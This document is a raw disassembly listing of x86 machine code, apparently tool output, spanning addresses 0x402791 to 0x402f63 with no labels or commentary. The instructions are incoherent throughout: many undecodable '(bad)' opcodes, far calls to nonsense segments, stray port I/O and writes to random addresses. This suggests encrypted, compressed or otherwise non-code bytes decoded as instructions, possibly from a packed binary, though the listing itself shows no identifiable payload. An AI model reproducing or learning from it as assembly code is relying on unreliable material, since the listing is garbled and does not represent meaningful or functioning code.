  402791:	mov    bh,0x6d
  402793:	xlat   BYTE PTR ds:[ebx]
  402794:	add    eax,0xd32bece
  402799:	jl     0x402751
  40279b:	push   0x46
  40279d:	xchg   DWORD PTR [ebx],edx
  40279f:	lea    edi,[esi]
  4027a1:	data16 das 
  4027a3:	sahf   
  4027a4:	loopne 0x402772
  4027a6:	add    eax,0x2c47e36a
  4027ab:	outs   dx,BYTE PTR ds:[esi]
  4027ac:	call   0x70d6:0x6953fbf4
  4027b3:	and    al,0x1d
  4027b5:	loope  0x402772
  4027b7:	pop    es
  4027b8:	sub    DWORD PTR [edi-0x3445eaed],ebp
  4027be:	xor    DWORD PTR [eax-0x1a13d453],ebx
  4027c4:	or     al,dl
  4027c6:	push   ss
  4027c7:	mov    cl,0x41
  4027c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027ca:	shl    BYTE PTR [ebp-0x58abab68],1
  4027d0:	jae    0x402846
  4027d2:	rcl    DWORD PTR [ecx+0xf],0xb3
  4027d6:	mov    ebx,0xeb0d9550
  4027db:	fisttp QWORD PTR ds:0x9b3080e9
  4027e1:	mov    dl,BYTE PTR [ebx]
  4027e3:	mov    esp,0x38f7531a
  4027e8:	mov    ch,0xc1
  4027ea:	mov    bh,0x8f
  4027ec:	imul   ecx,DWORD PTR [esp+eiz*4],0xf
  4027f0:	dec    edx
  4027f1:	xor    ah,al
  4027f3:	push   cs
  4027f4:	out    0xae,eax
  4027f6:	out    dx,eax
  4027f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027f8:	cmp    BYTE PTR [edx+0x6f72ee07],cl
  4027fe:	repz (bad) 
  402800:	push   cs
  402801:	mov    bl,0x77
  402803:	adc    DWORD PTR [esi-0x371b4ff2],ebp
  402809:	sbb    eax,0x36d5fc26
  40280e:	out    0x42,eax
  402810:	test   al,0xed
  402812:	xlat   BYTE PTR ds:[ebx]
  402813:	rcr    DWORD PTR [ecx],0xe1
  402816:	(bad)  
  402817:	jnp    0x4027d7
  402819:	add    eax,0x2f2c9789
  40281e:	out    dx,eax
  40281f:	ucomiss xmm4,DWORD PTR [esi-0x26bcb3fa]
  402826:	popf   
  402827:	sbb    cl,BYTE PTR ds:[edi-0x64f92ae9]
  40282e:	and    edx,ebx
  402830:	sar    BYTE PTR [edx+0x12],0x29
  402834:	push   edi
  402835:	dec    ebx
  402836:	add    eax,DWORD PTR [ecx+0x36a64772]
  40283c:	fbld   TBYTE PTR [ebp-0x3740ab74]
  402842:	cdq    
  402843:	out    0x73,al
  402845:	nop
  402846:	mov    esi,DWORD PTR [eax-0x4]
  402849:	fnsave ds:0xcc210469
  40284f:	stc    
  402850:	repz mov dx,0xab98
  402855:	and    BYTE PTR [edx+0x50],bh
  402858:	js     0x402817
  40285a:	push   edx
  40285b:	or     DWORD PTR [edx+esi*1+0x43f1a023],edx
  402862:	inc    edx
  402863:	inc    ebx
  402864:	sub    esp,DWORD PTR [esi+0x70]
  402867:	nop
  402868:	adc    BYTE PTR [esi+0x646dd1d7],ah
  40286e:	or     al,0xd6
  402870:	pop    esp
  402871:	push   ebp
  402872:	mov    ?,esp
  402874:	jbe    0x4028ae
  402876:	cld    
  402877:	jg     0x4028e8
  402879:	pmaxub mm1,QWORD PTR [ebx]
  40287c:	sub    DWORD PTR [edx-0x67dbfa8a],ebp
  402882:	fstp   DWORD PTR [ecx]
  402884:	push   esp
  402885:	out    0x43,al
  402887:	ror    BYTE PTR [esi+0x1f2729bf],0x8e
  40288e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40288f:	data16 xor al,BYTE PTR [edx]
  402892:	sbb    DWORD PTR [edx+0x7a],ebx
  402895:	adc    BYTE PTR [ebx],ah
  402897:	xchg   edx,eax
  402898:	dec    eax
  402899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40289a:	enter  0x5e1d,0x49
  40289e:	adc    BYTE PTR [eax],bh
  4028a0:	add    BYTE PTR ds:0xcf9b3ba1,dl
  4028a6:	call   0xb16a:0xb2909ba2
  4028ad:	lods   al,BYTE PTR ds:[esi]
  4028ae:	pusha  
  4028af:	outs   dx,BYTE PTR ds:[esi]
  4028b0:	fisubr WORD PTR [eax+0x23]
  4028b3:	pusha  
  4028b4:	sub    al,0x55
  4028b6:	cld    
  4028b7:	int    0x53
  4028b9:	jbe    0x40291d
  4028bb:	mov    al,0x6b
  4028bd:	or     al,0x3c
  4028bf:	rcr    BYTE PTR [edx],cl
  4028c1:	data16 ja 0x402939
  4028c4:	outs   dx,BYTE PTR ds:[esi]
  4028c5:	sub    DWORD PTR [eax+0x66],0x8946ab0f
  4028cc:	adc    al,BYTE PTR [edx+0x6f]
  4028cf:	ret    0x113
  4028d2:	imul   ebp,edx,0x3a
  4028d5:	mov    edx,0xd97f26ab
  4028da:	fbld   TBYTE PTR [ebx+0x43]
  4028dd:	or     eax,0xb674d732
  4028e2:	clc    
  4028e3:	fstp   QWORD PTR [eax]
  4028e5:	cdq    
  4028e6:	shl    DWORD PTR [esi-0x5],cl
  4028e9:	fcom   QWORD PTR [edi]
  4028eb:	stos   DWORD PTR es:[edi],eax
  4028ec:	dec    esp
  4028ed:	in     eax,dx
  4028ee:	jl     0x4028cd
  4028f0:	fcmovb st,st(3)
  4028f2:	xchg   ebp,eax
  4028f3:	dec    ebp
  4028f4:	dec    edx
  4028f5:	mov    dl,0x5a
  4028f7:	sbb    eax,0x3dee38dd
  4028fc:	sbb    dl,BYTE PTR [edi+0x1bf9206e]
  402902:	imul   DWORD PTR [ebp-0x13]
  402905:	inc    ebp
  402906:	ins    BYTE PTR es:[edi],dx
  402907:	ret    
  402908:	push   eax
  402909:	add    eax,0x7cc0aef1
  40290e:	or     ah,BYTE PTR [ecx]
  402910:	dec    ecx
  402911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402912:	fstp   QWORD PTR [ecx-0x5e]
  402915:	cmp    DWORD PTR ds:0xe55737c1,ebx
  40291b:	in     eax,dx
  40291c:	cs cli 
  40291e:	out    0x95,al
  402920:	loopne 0x402909
  402922:	into   
  402923:	add    al,0xb6
  402925:	cwde   
  402926:	ss dec ebp
  402928:	lahf   
  402929:	inc    ebx
  40292a:	clc    
  40292b:	loop   0x402952
  40292d:	push   ss
  40292e:	sbb    edi,edx
  402930:	push   edx
  402931:	xchg   DWORD PTR [eax+0x35475d36],ebp
  402937:	mov    fs:0x9446d46b,al
  40293d:	scas   eax,DWORD PTR es:[edi]
  40293e:	jle    0x4028d2
  402940:	or     ch,cl
  402942:	shl    DWORD PTR [ebp-0x60],0xcd
  402946:	pop    esp
  402947:	pop    ds
  402948:	test   al,0x8d
  40294a:	stos   DWORD PTR es:[edi],eax
  40294b:	mov    esi,0x8acd1358
  402950:	pop    edi
  402951:	xchg   ecx,eax
  402952:	pop    edi
  402953:	pop    ebx
  402954:	pop    edi
  402955:	jg     0x4029c2
  402957:	repnz push cs
  402959:	inc    edx
  40295a:	addr16 push 0xffffffb5
  40295d:	jbe    0x40296b
  40295f:	mov    ds:0x1389002a,eax
  402964:	xchg   edi,eax
  402965:	lods   al,BYTE PTR ds:[esi]
  402966:	mov    ah,0x10
  402968:	test   BYTE PTR [esi+ebp*8],dl
  40296b:	cmp    ebp,DWORD PTR [ebp+0x4]
  40296e:	mov    eax,DWORD PTR [edi+eiz*1-0xbb49990]
  402975:	mov    bl,0x29
  402977:	push   esp
  402978:	in     al,0x34
  40297a:	mov    esp,0x4db49329
  40297f:	push   ebx
  402980:	cmc    
  402981:	arpl   WORD PTR [eax+0x27],dx
  402984:	and    DWORD PTR [edx+edi*4],ebx
  402987:	lods   eax,DWORD PTR ds:[esi]
  402988:	rcr    DWORD PTR [ebx-0x6ee9712e],cl
  40298e:	push   edx
  40298f:	inc    edx
  402990:	dec    ebp
  402991:	cli    
  402992:	push   0xc
  402994:	jns    0x4029cd
  402996:	fwait
  402997:	xchg   BYTE PTR [edx-0x318dab31],ch
  40299d:	push   0x52
  40299f:	jnp    0x402959
  4029a1:	mov    esi,ebx
  4029a3:	sub    bl,dh
  4029a5:	lock fs add al,0xaa
  4029a9:	fsubr  st(2),st
  4029ab:	mov    WORD PTR [ecx],gs
  4029ad:	jo     0x40296e
  4029af:	or     al,0xb6
  4029b1:	inc    ecx
  4029b2:	hlt    
  4029b3:	mov    bh,0x5
  4029b5:	jbe    0x402937
  4029b7:	sub    al,0x22
  4029b9:	push   0x7
  4029bb:	int3   
  4029bc:	(bad)  
  4029bd:	mov    eax,0xe5eabd10
  4029c2:	rcl    esp,cl
  4029c4:	jmp    0x402955
  4029c6:	jp     0x40299b
  4029c8:	xchg   ebp,eax
  4029c9:	inc    edx
  4029ca:	loope  0x4029db
  4029cc:	(bad)  
  4029cd:	jp     0x4029d6
  4029cf:	test   BYTE PTR [esi*4+0x92f3f0c],0x5
  4029d7:	pop    ebp
  4029d8:	std    
  4029d9:	ret    
  4029da:	pop    ss
  4029db:	dec    bp
  4029dd:	fld    TBYTE PTR ds:0x9ed61400
  4029e3:	push   esp
  4029e4:	jge    0x4029eb
  4029e6:	ss ret 0xdfad
  4029ea:	pop    ebx
  4029eb:	add    bl,BYTE PTR [eax-0x10]
  4029ee:	dec    esi
  4029ef:	in     al,0x57
  4029f1:	or     eax,0xee9e6962
  4029f6:	sub    DWORD PTR ds:0xfefbf0f5,esi
  4029fc:	ds test al,0x85
  4029ff:	shl    DWORD PTR [ebx],1
  402a01:	and    ebx,DWORD PTR [si-0x5b]
  402a05:	in     eax,dx
  402a06:	push   es
  402a07:	test   al,0x70
  402a09:	or     al,0xb7
  402a0b:	ror    DWORD PTR [eax+0x49f3e6ba],0x20
  402a12:	shl    cl,0xd6
  402a15:	and    dh,BYTE PTR [edx+0x5a]
  402a18:	dec    esp
  402a19:	gs stc 
  402a1b:	inc    edi
  402a1c:	clc    
  402a1d:	pop    edx
  402a1e:	idiv   BYTE PTR [eax-0xa87ed09]
  402a24:	fistp  DWORD PTR [ecx+0x1862dc6c]
  402a2a:	inc    ebx
  402a2b:	jb     0x402a9f
  402a2d:	lea    esi,[ebp+0x785b5f06]
  402a33:	fs push ebx
  402a35:	cli    
  402a36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a37:	add    eax,0x81cd9d7b
  402a3c:	inc    ecx
  402a3d:	das    
  402a3e:	leave  
  402a3f:	std    
  402a40:	sbb    al,ch
  402a42:	ret    0x767c
  402a45:	xor    edx,DWORD PTR [eax+0xa]
  402a48:	(bad)
  402a4c:	(bad)  
  402a4d:	in     eax,dx
  402a4e:	and    ecx,ebp
  402a50:	in     al,dx
  402a51:	pop    edx
  402a52:	adc    DWORD PTR [edi+0x3b],0x5f
  402a56:	inc    ebp
  402a57:	mov    bl,0xbc
  402a59:	ds lock jmp 0x402a04
  402a5d:	jae    0x402aa1
  402a5f:	adc    BYTE PTR [esi+0x77257c45],0x2d
  402a66:	repz cmp eax,0x3cb718d1
  402a6c:	das    
  402a6d:	adc    al,0x5f
  402a6f:	cmp    al,al
  402a71:	call   0xc3412e66
  402a76:	es or  al,0xcb
  402a79:	mov    ds,WORD PTR [ebp+0x2a]
  402a7c:	mov    dl,0x56
  402a7e:	inc    eax
  402a7f:	mov    edi,0x6ae91a3a
  402a84:	das    
  402a85:	neg    DWORD PTR [edi+0xb67f3bd]
  402a8b:	inc    esi
  402a8c:	std    
  402a8d:	mov    ds:0xb9aab3ac,eax
  402a92:	inc    edi
  402a93:	and    DWORD PTR [ecx-0x17],ebp
  402a96:	popa   
  402a97:	sbb    DWORD PTR [ecx],0xd0f9246e
  402a9d:	mov    BYTE PTR ds:0x5bc86f0e,dl
  402aa3:	jl     0x402a65
  402aa5:	call   0xd65e:0x6955de9
  402aac:	popa   
  402aad:	add    dh,ah
  402aaf:	dec    eax
  402ab0:	cmp    eax,0xc1175212
  402ab5:	sub    esp,DWORD PTR [ebx+0x772f843a]
  402abb:	ret    
  402abc:	mov    bl,0x8f
  402abe:	mov    ebx,0x2732d654
  402ac3:	dec    ebx
  402ac4:	call   0xef8187e5
  402ac9:	or     DWORD PTR [ebx-0x5a0a4603],eax
  402acf:	rol    ecx,0x2c
  402ad2:	loopne 0x402ab8
  402ad4:	enter  0x2576,0x16
  402ad8:	cmp    eax,0xabf998da
  402add:	addr16 in al,dx
  402adf:	sti    
  402ae0:	jl     0x402a65
  402ae2:	inc    edx
  402ae3:	push   ecx
  402ae4:	addr16 mov esi,0x13b0f7f4
  402aea:	push   0xffffffdf
  402aec:	loopne 0x402a9f
  402aee:	xchg   dh,bh
  402af0:	pop    edi
  402af1:	(bad)  
  402af2:	out    dx,eax
  402af3:	lods   al,BYTE PTR ds:[esi]
  402af4:	xor    eax,0xcdb5b655
  402af9:	jbe    0x402afc
  402afb:	jae    0x402ac8
  402afd:	sub    al,0xb0
  402aff:	mov    eax,ds:0x557bd0a4
  402b04:	aad    0x64
  402b06:	push   es
  402b07:	adc    BYTE PTR [ecx+edi*4+0x59],0xbe
  402b0c:	and    eax,0x2c674a2d
  402b11:	fmul   st,st(1)
  402b13:	cwde   
  402b14:	sub    al,0x69
  402b16:	into   
  402b17:	jmp    0x963f45bd
  402b1c:	inc    esi
  402b1d:	(bad)  
  402b1e:	mov    dh,0x96
  402b20:	mov    edx,DWORD PTR [edi+0x52]
  402b23:	mov    DWORD PTR ds:0x51e7f45a,esi
  402b29:	jo     0x402ba4
  402b2b:	pop    esp
  402b2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b2d:	hlt    
  402b2e:	imul   ecx,DWORD PTR [eax],0xb
  402b31:	rol    BYTE PTR [esi-0x14],cl
  402b34:	imul   edi,DWORD PTR ds:0x573844c2,0xd15c37dc
  402b3e:	loopne 0x402b3e
  402b40:	aaa    
  402b41:	retf   0x9e26
  402b44:	mov    edi,0x7a293062
  402b49:	lea    esp,[eax-0x7f43b657]
  402b4f:	push   edx
  402b50:	stos   BYTE PTR es:[edi],al
  402b51:	repnz xor ebx,DWORD PTR [ecx-0x7d46d465]
  402b58:	pop    ecx
  402b59:	lahf   
  402b5a:	or     al,0x7d
  402b5c:	rol    BYTE PTR [ebx+eax*8+0x257e0c34],cl
  402b63:	jns    0x402af8
  402b65:	push   ebp
  402b66:	cld    
  402b67:	sbb    al,0xb7
  402b69:	xchg   BYTE PTR [ecx+0x5d3a21a5],dh
  402b6f:	cdq    
  402b70:	psubq  mm5,QWORD PTR [edx]
  402b73:	das    
  402b74:	push   ebx
  402b75:	iret   
  402b76:	inc    edi
  402b77:	loope  0x402b49
  402b79:	je     0x402b4a
  402b7b:	xor    edx,ebp
  402b7d:	imul   esp,DWORD PTR [edi-0x60],0xffffff8f
  402b81:	sbb    DWORD PTR [edx+0x33],esi
  402b84:	cld    
  402b85:	jb     0x402b25
  402b87:	sub    BYTE PTR [edi+0x29ac0b7c],bl
  402b8d:	pop    edx
  402b8e:	sbb    esi,DWORD PTR [eax-0x1349fb24]
  402b94:	lock push ss
  402b96:	inc    ebx
  402b97:	loopne 0x402c0f
  402b99:	cmp    al,0x6f
  402b9b:	adc    eax,0xc349a330
  402ba0:	gs jge 0x402b93
  402ba3:	scas   eax,DWORD PTR es:[edi]
  402ba4:	pushf  
  402ba5:	xchg   esp,eax
  402ba6:	clc    
  402ba7:	pop    ds
  402ba8:	push   edi
  402ba9:	lds    edi,FWORD PTR [ebp-0x80]
  402bac:	mov    bl,0xff
  402bae:	xor    BYTE PTR [ebx+0x7a3ee26c],ah
  402bb4:	int    0xf5
  402bb6:	shl    BYTE PTR [eax-0x72],1
  402bb9:	int3   
  402bba:	rcr    BYTE PTR [edi-0x27],1
  402bbd:	sahf   
  402bbe:	jae    0x402bdb
  402bc0:	frstor [eax+eax*4]
  402bc3:	or     eax,DWORD PTR [edx+0x6d]
  402bc6:	add    DWORD PTR [esi-0x663aec42],esi
  402bcc:	jmp    FWORD PTR [ebp-0x11]
  402bcf:	test   al,0x26
  402bd1:	(bad)  
  402bd2:	test   al,0x4a
  402bd4:	jle    0x402c0b
  402bd6:	and    ch,BYTE PTR [eax+0x2bf86102]
  402bdc:	enter  0x1b64,0x97
  402be0:	retf   
  402be1:	inc    ebx
  402be2:	jns    0x402bda
  402be4:	ret    
  402be5:	push   eax
  402be6:	jb     0x402be2
  402be8:	lds    eax,FWORD PTR [ebp+0x727f2b1]
  402bee:	xor    BYTE PTR [edx+0x1afa3449],ch
  402bf4:	(bad)  
  402bf5:	mov    bh,0x2a
  402bf7:	mov    esi,0xe57e8f41
  402bfc:	stos   BYTE PTR es:[edi],al
  402bfd:	mov    ds:0x474fe9d9,al
  402c02:	sbb    cl,ah
  402c04:	jge    0x402c28
  402c06:	ret    
  402c07:	mov    BYTE PTR [ebp+ebx*4-0x7210d072],ch
  402c0e:	inc    ebp
  402c0f:	cmp    eax,0x86d7019d
  402c14:	dec    edx
  402c15:	sar    BYTE PTR cs:[esi],0xc2
  402c19:	mov    ecx,0x7b2a6584
  402c1e:	jecxz  0x402c99
  402c20:	lock xor eax,0x5962ab53
  402c26:	mov    bh,0x8a
  402c28:	sar    edx,cl
  402c2a:	mov    ?,WORD PTR [eax+0x42]
  402c2d:	xchg   edx,eax
  402c2e:	and    esi,DWORD PTR [esi]
  402c30:	adc    eax,0xc769d1d0
  402c35:	sub    ebp,DWORD PTR [eax]
  402c37:	push   ebx
  402c38:	mov    ds:0x45ee0705,al
  402c3d:	call   0xb312:0x1f59e75c
  402c44:	test   al,0xc3
  402c46:	inc    ebp
  402c47:	sub    esi,edx
  402c49:	cmp    al,0x25
  402c4b:	adc    esi,DWORD PTR [edx+0xe]
  402c4e:	push   edi
  402c4f:	cmc    
  402c50:	dec    ebx
  402c51:	push   esi
  402c52:	aas    
  402c53:	and    eax,DWORD PTR [eax+0x4780e3df]
  402c59:	pop    ss
  402c5a:	ss mov dl,0xa2
  402c5d:	push   eax
  402c5e:	add    al,0xa7
  402c60:	pop    ss
  402c61:	dec    edi
  402c62:	leave  
  402c63:	enter  0x2ebc,0x3d
  402c67:	cdq    
  402c68:	lds    esp,FWORD PTR [edi+ecx*4+0x15]
  402c6c:	(bad)  
  402c6d:	pop    ds
  402c6e:	push   edx
  402c6f:	fucomip st,st(2)
  402c71:	in     eax,0xdb
  402c73:	mov    esp,0x749acb89
  402c78:	cmp    eax,0x11b3353a
  402c7d:	test   eax,ebx
  402c7f:	out    0xae,al
  402c81:	pop    esi
  402c82:	cmp    eax,0x917de520
  402c87:	xor    al,0x99
  402c89:	sbb    DWORD PTR [edi+eiz*4-0x71],0x65
  402c8e:	dec    ebp
  402c8f:	jb     0x402ccc
  402c91:	out    0xc7,al
  402c93:	fld    DWORD PTR [eax+0x4ed734d1]
  402c99:	repnz sub edi,edi
  402c9c:	test   DWORD PTR [edx],ecx
  402c9e:	adc    al,bh
  402ca0:	or     BYTE PTR [edx+0x3f],ah
  402ca3:	mov    cl,0x78
  402ca5:	add    ebx,DWORD PTR [edi+0x3d]
  402ca8:	outs   dx,BYTE PTR ds:[esi]
  402ca9:	add    eax,0x81812ca3
  402cae:	(bad)  
  402caf:	enter  0x6ed3,0x2
  402cb3:	shr    BYTE PTR [edx],cl
  402cb5:	lds    ebx,FWORD PTR [edx-0x57]
  402cb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cb9:	stos   BYTE PTR es:[edi],al
  402cba:	mov    ebp,0x2deb3707
  402cc0:	adc    DWORD PTR [ecx],edx
  402cc2:	out    0xbf,al
  402cc4:	jns    0x402d00
  402cc6:	jnp    0x402cd6
  402cc8:	push   0xc2605385
  402ccd:	out    dx,al
  402cce:	push   esp
  402ccf:	fisttp DWORD PTR [ebx-0x85b80ab]
  402cd5:	ret    0xe5bb
  402cd8:	hlt    
  402cd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402cda:	sbb    BYTE PTR [edi],cl
  402cdc:	sbb    al,0xae
  402cde:	mov    edi,0x4275d8c2
  402ce3:	xor    BYTE PTR [ebx+0x58],dh
  402ce6:	sub    BYTE PTR [esi+0x56],dh
  402ce9:	add    BYTE PTR ds:0xbbdb4860,0x99
  402cf0:	fnstenv [ebx+0x169e40ea]
  402cf6:	nop
  402cf7:	test   eax,0x9a4a3813
  402cfc:	(bad)  
  402cfe:	fstp   QWORD PTR [esi+0x280f4ed2]
  402d04:	adc    BYTE PTR [edi],ah
  402d06:	(bad)  [eax+0x6888c70f]
  402d0c:	xchg   ecx,eax
  402d0d:	mov    bh,0xe3
  402d0f:	idiv   BYTE PTR ss:[ecx-0x13]
  402d13:	in     al,0x5d
  402d15:	mov    al,ds:0x4fb29c48
  402d1a:	popf   
  402d1b:	js     0x402cd4
  402d1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402d1e:	or     ebp,eax
  402d20:	cmp    esp,DWORD PTR [esi-0x4c202dc7]
  402d26:	popf   
  402d27:	data16 test BYTE PTR [edi-0x14],dl
  402d2b:	sahf   
  402d2c:	fdiv   DWORD PTR [eax+ecx*2+0x2f6d065c]
  402d33:	xlat   BYTE PTR ds:[ebx]
  402d34:	fwait
  402d35:	pop    ss
  402d36:	(bad)  
  402d37:	into   
  402d38:	xchg   DWORD PTR [edi+0x4b],ebp
  402d3b:	jnp    0x402cf7
  402d3d:	sub    eax,0x3e2a0255
  402d42:	cmc    
  402d43:	add    dl,BYTE PTR [ebx-0xc3c1e0f]
  402d49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d4a:	aam    0x74
  402d4c:	jp     0x402d13
  402d4e:	ds push ebx
  402d50:	inc    edi
  402d51:	mov    ds:0x4b707909,al
  402d56:	sbb    al,0x4e
  402d58:	push   edi
  402d59:	mov    ah,0x79
  402d5b:	or     al,0x8f
  402d5d:	pop    edx
  402d5e:	retf   0xc6fe
  402d61:	dec    esi
  402d62:	test   eax,0x83ac74ec
  402d67:	or     al,0x9
  402d69:	and    DWORD PTR [ecx+0x13],esp
  402d6c:	mov    ch,0x4a
  402d6e:	push   edi
  402d6f:	jmp    0x402de9
  402d71:	stos   BYTE PTR es:[edi],al
  402d72:	repnz push 0xf69e9720
  402d78:	jge    0x402d82
  402d7a:	jg     0x402d51
  402d7c:	jmp    FWORD PTR [esi]
  402d7e:	ror    BYTE PTR [edx+edi*2-0x3d759f17],0x9
  402d86:	cwde   
  402d87:	add    BYTE PTR [ebp+0x7b1ca65e],cl
  402d8d:	cld    
  402d8e:	adc    ch,ch
  402d90:	sahf   
  402d91:	xor    BYTE PTR [ebp-0x7e],dl
  402d94:	and    al,0xfe
  402d96:	lods   al,BYTE PTR ds:[esi]
  402d97:	(bad)  
  402d98:	cmp    DWORD PTR [edx-0x21],esp
  402d9b:	jle    0x402d67
  402d9d:	mov    edi,0x51ae1cc1
  402da2:	inc    edx
  402da3:	jnp    0x402dc7
  402da5:	xor    esi,DWORD PTR [esi-0x5]
  402da8:	dec    ecx
  402da9:	inc    eax
  402daa:	setne  BYTE PTR [ebp+0x19]
  402dae:	push   esi
  402daf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402db0:	jmp    0x858e8d82
  402db5:	add    al,0x46
  402db7:	lock stos DWORD PTR es:[edi],eax
  402db9:	out    dx,al
  402dba:	mov    ds:0x37d1e189,al
  402dbf:	jl     0x402db7
  402dc1:	push   cs
  402dc2:	retf   
  402dc3:	cmp    eax,0xba8a4c7d
  402dc8:	jb     0x402e23
  402dca:	outs   dx,DWORD PTR ds:[esi]
  402dcb:	in     al,0x5d
  402dcd:	test   ah,dl
  402dcf:	mov    ah,0xe6
  402dd1:	call   0x993d163d
  402dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dd7:	inc    DWORD PTR [ebx+0x3ebfc605]
  402ddd:	pop    ds
  402dde:	sbb    eax,0x34f52b7d
  402de3:	add    bh,0x65
  402de6:	push   eax
  402de7:	adc    BYTE PTR [eax-0x76],0xfe
  402deb:	add    DWORD PTR [edx],ecx
  402ded:	das    
  402dee:	mov    cl,0x74
  402df0:	out    0x9a,al
  402df2:	ror    BYTE PTR [ebp-0x450eb3cc],0x13
  402df9:	add    DWORD PTR [esi],ebp
  402dfb:	xchg   ebx,eax
  402dfc:	fcomip st,st(3)
  402dfe:	or     BYTE PTR [ecx+0x47e18bca],0x84
  402e05:	pop    ebx
  402e06:	mov    ds:0x546f9352,eax
  402e0b:	adc    BYTE PTR [edx],dl
  402e0d:	ss mov esp,0xf6760f43
  402e13:	sub    eax,0xd5461bd1
  402e18:	jnp    0x402df0
  402e1a:	or     esp,edx
  402e1c:	aam    0x10
  402e1e:	std    
  402e1f:	mov    ah,0x74
  402e21:	jb     0x402dd9
  402e23:	lods   eax,DWORD PTR ds:[esi]
  402e24:	pop    edx
  402e25:	lock pop dx
  402e28:	mov    ebx,0x4ff0a964
  402e2d:	cwde   
  402e2e:	inc    esi
  402e2f:	add    edi,DWORD PTR [ecx]
  402e31:	loop   0x402e1f
  402e33:	test   eax,0xbecae78d
  402e38:	xor    al,0x3b
  402e3a:	sbb    al,0x5
  402e3c:	retf   
  402e3d:	dec    ecx
  402e3e:	fild   DWORD PTR [edx+0x234812df]
  402e44:	aam    0x65
  402e46:	or     BYTE PTR es:[ebx-0x2a],ah
  402e4a:	sbb    eax,0xd7a97f4e
  402e4f:	add    eax,0x75e0a445
  402e54:	ss shr esi,1
  402e57:	sub    bh,dh
  402e59:	lds    ebp,FWORD PTR [esi-0x2e]
  402e5c:	cli    
  402e5d:	mov    ds,WORD PTR [eax-0x143e5474]
  402e63:	pop    ebp
  402e64:	shr    DWORD PTR [edi-0x58],1
  402e67:	hlt    
  402e68:	in     eax,0x4a
  402e6a:	fdivrp st(0),st
  402e6c:	ret    0x3938
  402e6f:	lds    ebx,FWORD PTR [ecx]
  402e71:	fmul   st,st(6)
  402e73:	popa   
  402e74:	cmp    BYTE PTR [esi+0x7d],0x36
  402e78:	jno    0x402e77
  402e7a:	push   esp
  402e7b:	in     eax,dx
  402e7c:	push   cs
  402e7d:	(bad)  
  402e7e:	push   esi
  402e7f:	lock mov ebp,DWORD PTR [edx+eax*2-0x3f8563ff]
  402e87:	cmp    esp,DWORD PTR [edi]
  402e89:	or     al,0x54
  402e8b:	repz in eax,0xff
  402e8e:	xor    BYTE PTR [esi-0x13],0xbe
  402e92:	mov    bl,0xc
  402e94:	inc    edi
  402e95:	jecxz  0x402ebf
  402e97:	repz int3 
  402e99:	cmp    edi,DWORD PTR [esi+ecx*1+0x1e9a5c3e]
  402ea0:	pop    ss
  402ea1:	jmp    esi
  402ea3:	xchg   ebp,eax
  402ea4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402ea5:	sbb    dl,BYTE PTR [eax+0x4c350651]
  402eab:	ins    DWORD PTR es:[edi],dx
  402eac:	call   0xf924c39f
  402eb1:	cmp    dl,BYTE PTR [ecx-0x27]
  402eb4:	jle    0x402e9a
  402eb6:	xchg   edi,eax
  402eb7:	pop    ecx
  402eb8:	mov    WORD PTR [ebx+0x72deea9b],ss
  402ebe:	xchg   edx,eax
  402ebf:	pop    edx
  402ec0:	mov    dh,0x71
  402ec2:	imul   DWORD PTR [esi]
  402ec4:	push   0x4970675
  402ec9:	add    al,0xaa
  402ecb:	mov    al,0xfd
  402ecd:	mov    BYTE PTR [eax],dl
  402ecf:	or     ch,bh
  402ed1:	loop   0x402f3f
  402ed3:	cs fwait
  402ed5:	mov    bl,BYTE PTR [esi+0x78500ee2]
  402edb:	es (bad) 
  402edd:	xor    dh,BYTE PTR [edx-0x67]
  402ee0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402ee1:	xor    eax,DWORD PTR [eax-0x17602305]
  402ee7:	fsub   QWORD PTR [ebp+0x43b514b8]
  402eed:	or     al,0xb7
  402eef:	push   eax
  402ef0:	sub    DWORD PTR [ebx+eax*2+0x47],esi
  402ef4:	jnp    0x402ee8
  402ef6:	mov    ds:0xc20a1760,eax
  402efb:	xchg   esp,eax
  402efc:	jmp    0xa4f7:0xd6e5b46d
  402f03:	popa   
  402f04:	pusha  
  402f05:	enter  0xe270,0xa1
  402f09:	pop    edx
  402f0a:	pop    edx
  402f0b:	adc    BYTE PTR [edi],0x66
  402f0e:	xor    eax,0x7a7c579f
  402f13:	mov    bh,0xa4
  402f15:	pop    es
  402f16:	cmp    al,0xc1
  402f18:	cmp    al,0x1e
  402f1a:	fld    TBYTE PTR [di]
  402f1d:	adc    ecx,DWORD PTR [esi+0x375c9374]
  402f23:	addr16 int 0xae
  402f26:	lds    esi,FWORD PTR [ecx-0x27]
  402f29:	jne    0x402ed6
  402f2b:	cdq    
  402f2c:	xchg   ecx,eax
  402f2d:	dec    ecx
  402f2e:	(bad)  
  402f2f:	cmp    esp,DWORD PTR [ebx]
  402f31:	aad    0x8f
  402f33:	not    BYTE PTR [ebx+ecx*8]
  402f36:	xchg   ecx,eax
  402f37:	clc    
  402f38:	sbb    al,0xe2
  402f3a:	(bad)
  402f3d:	sbb    bh,BYTE PTR [ebx+0x42]
  402f40:	push   ebx
  402f41:	cmp    BYTE PTR [eax+0xa],ah
  402f44:	add    al,0x66
  402f46:	inc    DWORD PTR [ebp-0x3c]
  402f49:	hlt    
  402f4a:	or     DWORD PTR [ecx+0x60],ebx
  402f4d:	cdq    
  402f4e:	(bad)  
  402f4f:	in     eax,dx
  402f50:	xchg   esp,eax
  402f51:	push   ds
  402f52:	mov    al,ds:0x8a25e64d
  402f57:	push   ecx
  402f58:	loopne 0x402fcf
  402f5a:	jp     0x402f62
  402f5c:	outs   dx,DWORD PTR ds:[esi]
  402f5d:	adc    DWORD PTR [ebp+ebx*1+0x3d],edx
  402f61:	mov    cl,0xbf
  402f63:	pushf  
